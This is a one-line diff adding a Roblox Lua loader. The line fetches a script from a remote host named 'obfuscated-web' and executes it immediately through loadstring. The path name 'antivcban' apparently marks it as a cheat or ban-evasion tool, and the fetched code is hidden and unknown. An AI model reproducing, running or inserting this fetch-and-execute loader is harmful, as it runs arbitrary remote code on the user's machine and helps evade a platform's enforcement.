@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://obfuscated-web.onrender.com/raw/antivcban?key=8HVhBVpJzbkT0CpPOC9PrNUy5NL8fRIWpWhb97tZMuviZJYFl6E5ILMmAs8H7K45"))()
